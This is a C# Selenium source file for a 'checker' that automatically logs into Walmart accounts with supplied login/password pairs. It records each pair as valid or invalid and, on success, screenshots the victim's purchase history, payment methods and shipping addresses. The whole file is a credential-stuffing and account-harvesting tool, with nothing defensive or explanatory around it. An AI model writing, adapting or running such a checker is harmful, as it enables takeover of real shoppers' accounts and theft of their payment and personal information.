using AppData.Model;
using OpenQA.Selenium;
using System;
using System.IO;
using System.Threading;

namespace AppData.Checkers
{
    public class Wallmart
    {
        public void Check(string login, string password, IWebDriver browser)
        {
            var store = new Store();
            var user = new User(login, password);
            var fs = new FileStream(store.LogFileName("Walmart"), FileMode.Append, FileAccess.Write);
            var sw = new StreamWriter(fs);

            browser.Navigate().GoToUrl("https://www.walmart.com/account/login");

            var emailInput = browser.FindElement(By.Name("email"));
            var passwordInput = browser.FindElement(By.Name("password"));
            var rememberMe = browser.FindElement(By.XPath("//div[4]/div/div/label"));
            var submitButton = browser.FindElement(By.XPath("//button[@type='submit']"));
            emailInput.Click();
            emailInput.Clear();
            emailInput.SendKeys(user.Login);
            passwordInput.Clear();
            passwordInput.SendKeys(user.Password);
            rememberMe.Click();
            submitButton.Click();
            Thread.Sleep(1000);

            if (browser.Url == "https://www.walmart.com/account/login")
            {
                browser.FindElement(By.CssSelector("body > div > div > div > div.login-wrapper-container > div > section > form > " +
                                          "div.form-field-password > div > div.js-password > div > button")).Click();
                ((ITakesScreenshot)browser).GetScreenshot().SaveAsFile(store.ScreenShotFileName("Wallmart", login), System.Drawing.Imaging.ImageFormat.Jpeg);
                sw.WriteLine(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "|" + login + "|" + password + "|false");
            }
            else
            {
                do
                {
                    Thread.Sleep(1000);
                }
                while (browser.FindElement(By.XPath("(//a[contains(text(),'Your Account')])[2]")) == null);
                browser.FindElement(By.LinkText("Purchase History")).Click();
                browser.FindElement(By.CssSelector("div.flyout.flyout-bottom.flyout-align-null.flyout-animate.flyout-fluid.flyout-button.xs-margin-ends > button.dropdown.btn.dropdown")).Click();
                browser.FindElement(By.XPath("(//button[@type='button'])[42]")).Click();
                Thread.Sleep(500);
                sw.WriteLine(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "|" + login + "|" + password + "|true");
                ((ITakesScreenshot)browser).GetScreenshot().SaveAsFile(store.ScreenShotFileName("Walmart_history", login), System.Drawing.Imaging.ImageFormat.Jpeg);
                browser.FindElement(By.LinkText("Payment Methods")).Click();
                Thread.Sleep(500);
                ((ITakesScreenshot)browser).GetScreenshot().SaveAsFile(store.ScreenShotFileName("Walmart_Payment", login), System.Drawing.Imaging.ImageFormat.Jpeg);
                browser.FindElement(By.LinkText("Your Account")).Click();
                browser.FindElement(By.LinkText("Shipping Addresses")).Click();
                Thread.Sleep(500);
                ((ITakesScreenshot)browser).GetScreenshot().SaveAsFile(store.ScreenShotFileName("Walmart_Address", login), System.Drawing.Imaging.ImageFormat.Jpeg);
            }
            sw.Close();
            fs.Close();
        }
    }
}
